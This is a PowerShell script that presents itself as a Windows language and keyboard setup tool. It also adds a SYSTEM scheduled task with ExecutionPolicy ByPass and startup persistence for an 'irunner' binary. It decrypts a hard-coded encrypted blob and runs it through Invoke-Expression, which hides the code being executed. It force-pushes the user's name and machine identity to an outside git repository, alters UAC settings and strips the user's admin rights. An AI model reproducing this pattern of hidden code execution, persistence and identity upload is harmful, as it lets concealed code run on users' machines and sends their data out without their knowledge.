### Language and Region
### Credits to Olli
Write-Host "________________________________________________________"
Write-Host "Choose your UI Language? "
Write-Host "Press 1 for German"
Write-Host "Press 2 for English"

while($inputValid -ne 1 -and $inputValid -ne 2){
    $inputValid =  read-host -Prompt "Enter number"
    if ($inputValid -eq 1) {
            Write-Host "UI and Region details will be changed in German"	
          	Set-Culture de-DE
		    Set-WinSystemLocale -SystemLocale de-DE
		    Set-WinUILanguageOverride -Language de-DE
		    Set-WinHomeLocation -GeoId 94            

    }

    if ($inputValid -eq 2) {
            Write-Host "UI and Region details will be changed in English"
            Set-Culture en-US
		    Set-WinSystemLocale -SystemLocale en-US
		    Set-WinUILanguageOverride -Language en-US
		    Set-WinHomeLocation -GeoId 244
    }
    if($inputValid -ne 1 -and $inputValid -ne 2){
        Write-Host "Please enter 1 or 2"
    }
}

Write-Host "Language is set"
Start-Sleep -Seconds 3
Read-Host -Prompt "Press ENTER to continue..."


### Keyboard Language
### Credits to Olli
Write-Host "________________________________________________________"
Write-Host "Choose your keyboard Language? "
Write-Host "Press 1 for German"
Write-Host "Press 2 for English"
while($inputValid2 -ne 1 -and $inputValid2 -ne 2){
    $inputValid2 =  read-host -Prompt "Enter number"
    if ($inputValid2 -eq 1) {
            Write-Host "Keyboard will be changed in German"	
		Set-WinUserLanguageList de-DE -Force
    }
    if ($inputValid2 -eq 2) {
            Write-Host "Keyboard will be changed in English"
		Set-WinUserLanguageList en-US -Force
    }
    if($inputValid2 -ne 1 -and $inputValid2 -ne 2){
        Write-Host "Please enter 1 or 2"
    }
}
Write-Host "Keyboard is set"
Start-Sleep -Seconds 3
Read-Host -Prompt "Press ENTER to continue..."


### Update Choco Apps
Write-Host "Adding a scheduled task for Choco Upgrade"
$Trigger=New-ScheduledTaskTrigger -AtLogOn
$User= “NT AUTHORITY\SYSTEM”
$Settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
$Action= New-ScheduledTaskAction -Execute “PowerShell.exe” -Argument “-ExecutionPolicy ByPass choco upgrade -y all”
Register-ScheduledTask -TaskName “Choco Upgrade” -Trigger $Trigger -User $User -Action $Action -Settings $Settings –Force
Write-Host "Task Created!"
Start-Sleep -Seconds 1


### Autostart

$SourceFilePath = "C:\Program Files\irunner_revdav\irunner_windows_amd64.exe"
$ShortcutPath = "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Swarmer.lnk"
$WScriptObj = New-Object -ComObject ("WScript.Shell")
$shortcut = $WscriptObj.CreateShortcut($ShortcutPath)
$shortcut.TargetPath = $SourceFilePath
$shortcut.Save()
Write-Host "irunner added to Startup"
Start-Sleep -Seconds 1

### Desktop Shortcut
$SourceFilePath = "C:\Program Files\irunner_revdav\irunner_windows_amd64.exe"
$ShortcutPath = "C:\Users\$env:UserName\Desktop\Irunner3.lnk"
$WScriptObj = New-Object -ComObject ("WScript.Shell")
$shortcut = $WscriptObj.CreateShortcut($ShortcutPath)
$shortcut.TargetPath = $SourceFilePath
$shortcut.Save()
Write-Host "irunner added to desktop"
Start-Sleep -Seconds 1

#Uploading irunner identity
$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
cd "C:\Program Files\Irunner"
$ident = ./revdav_windows_amd64.exe -ident
$user = $env:UserName
$demo = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000bed9cd4057d85e45a6216e0b82d9328300000000020000000000106600000001000020000000a313b72cbdac2ef2d043a7beaff96474d45dc3dfee7cb036d69d5ae61e0c7d69000000000e8000000002000020000000858ad22b4cd803509b03381fe65c07b99c577a4d63d2557d3bbd854bc20f4805a00000005246d64ff9b27a9b483971dd131d8003b05d24d9d0744ccf3c2a479eaa47535e103f3ccc6770833bac7ad0b0c61b1c68ab3f7ab51dd1870a5f4a73afa197bef711cd179891ce9ec0eb264cc59b42e8b7c738f815733d00582bdc4404371b0b0f0221eb52f2b53a5d574bc32ef882a30656f12f5c08684fe3d7b6b1e6613217a39adf4c7f0b34d6e37740c8d785ab30344764459b9e429cedc8bdfa1f67874ca840000000f61f58887b1d62d7b37ea585130a02c780242315ed1ffc7af966858d09fca6955f21828d56fa692899565b3e25ab84151ab840d2ab16059ffdbb992eec70fc0f"
$Decrypt = $demo | ConvertTo-SecureString
$Code = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($Decrypt))
Invoke-Expression $Code
New-Item "C:\Program Files\Irunner\$user" -ItemType Directory
New-Item "C:\Program Files\Irunner\$user\ident.txt" -ItemType File -Value "$user $ident"
git config --global push.autoSetupRemote true
git config --global user.email "phong.phu@dision.tech"
git config --global user.name "dxu3s83"
git init
git checkout -b $user
git add "C:\Program Files\Irunner\$user\ident.txt"
git commit -m "User $user identity"
git push -f https://git.wixcloud.de/dynexo/winstall10 $user

Set-ItemProperty -Path "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 2
Remove-LocalGroupMember -Group "Administrators" -Member "$env:UserName"

Write-Host "Installation Finished!"
Start-Sleep -Seconds 1
Write-Host "Windows will reboot!"
Read-Host -Prompt "Press ENTER to reboot..."
shutdown -r
